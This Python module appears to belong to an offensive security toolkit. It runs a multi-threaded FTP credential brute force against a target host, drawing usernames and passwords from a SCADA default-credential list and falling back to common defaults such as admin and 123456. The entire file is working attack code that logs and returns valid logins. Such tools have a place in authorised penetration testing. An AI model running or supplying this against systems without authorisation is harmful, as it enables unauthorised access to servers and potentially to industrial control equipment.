import ftplib
from concurrent.futures import ThreadPoolExecutor, as_completed
from utils.logger import setup_logger
from utils.scadapass_updater import load_scadapass_credentials

logger = setup_logger()

def try_ftp_login(target, port, user, password, timeout=5):
    try:
        ftp = ftplib.FTP()
        ftp.connect(host=target, port=port, timeout=timeout)
        ftp.login(user=user, passwd=password)
        logger.info(f"[✓] Valid FTP credentials: {user}:{password}")
        ftp.quit()
        return (user, password)
    except ftplib.error_perm as e:
        if "530" in str(e):
            logger.debug(f"[✗] Invalid FTP login for {user}:{password}")
        else:
            logger.warning(f"[!] FTP error ({user}:{password}) - {e}")
    except Exception as e:
        logger.debug(f"[!] FTP connection error for {user}:{password} - {e}")
    return None


def ftp_brute_force_with_scadapass(target, scadapass_file=None, system_name=None, port=21, max_workers=20):
    users = []
    passwords = []

    creds = load_scadapass_credentials(scadapass_file) if scadapass_file else {}

    if system_name and system_name in creds:
        users = [u for u, _ in creds[system_name]]
        passwords = [p for _, p in creds[system_name]]
    else:
        for v in creds.values():
            users.extend([u for u, _ in v])
            passwords.extend([p for _, p in v])

    users = list(set(users)) or ['ftp', 'admin', 'user']
    passwords = list(set(passwords)) or ['ftp', 'admin', '123456', 'password']

    logger.info(f"[*] Starting FTP brute force on {target}:{port} with {len(users)} users and {len(passwords)} passwords")

    valid = None
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [
            executor.submit(try_ftp_login, target, port, user, password)
            for user in users
            for password in passwords
        ]
        for future in as_completed(futures):
            result = future.result()
            if result:
                valid = result
                break

    if not valid:
        logger.info("[!] No valid FTP credentials found")
    return valid
